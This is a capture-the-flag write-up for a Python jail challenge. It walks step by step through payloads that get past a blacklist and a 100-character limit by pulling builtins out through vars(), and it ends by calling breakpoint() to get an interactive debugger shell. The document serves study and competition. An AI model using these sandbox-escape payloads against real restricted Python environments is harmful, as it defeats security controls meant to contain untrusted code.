# Golfing 100 Character

u can see at the <a href="blacklist.py">code</a>, it still using LITE ban and u can use more than 100 character.

First, lets use inline for loop to iterate __vars()__ and get the builtins

```
[x for x in vars()]
```

<img src='img/1.png' width='600px'>

u can see if the __\_\_builtins\_\___ function is on array, so we need to know where is the index of that function. Cuz if we call the function normally, it will make the payload longer.

<img src='img/2.png' width='300px'>

after that, using this payload will call the __\_\_builtins\_\___ function.

```
[x for x in vars()][6]
```

<img src='img/3.png' width='300px'>

now lets try to put in inside the __vars()__

```
vars(vars()[[x for x in vars()][6]])
```

<img src='img/4.png' width='800px'>

now take the __eval()__ and __input()__ using

```
vars(vars()[[x for x in vars()][6]])['eval']
```

and

```
vars(vars()[[x for x in vars()][6]])['input']
```

<img src='img/5.png' width='400px'>

it works, now put the __input()__ inside the __eval()__

<img src='img/6.png' width='700px'>

ok its done, next, lets check the length of the payload using my own <a href='count_char.py'>code</a>.

<img src='img/7.png' width='900px'>

but the main problem is here, test the payload to the blacklist code.

<img src='img/8.png' width='800px'>

yea, i forgot bout __LITE Ban__, lets fix it using another way

<img src='img/9.png' width='800px'>

the solution is change the __"LITE"__ with hex, but look what happen, the payload is over 100 character, but i have another solution.

There is some function that is shorter than __eval(input())__, that is __breakpoint()__.

So, instead of using

```
eval(input())
```

to get the shell, we can use that is shorter

```
breakpoint()
```

in a normal syntax, __breakpoint()__ is more shorter one character, and __breakpoint()__ will send us to Pdb (Python debugger).

use this syntax to know what is builtins function

```
[y for y in vars(vars()[[x for x in vars()][6]])]
```

<img src='img/10.png' width='1000px'>

__breakpoint()__ is one of builtins function, so, lets call it

```
vars(vars()[[x for x in vars()][6]])['breakpoint']()
```


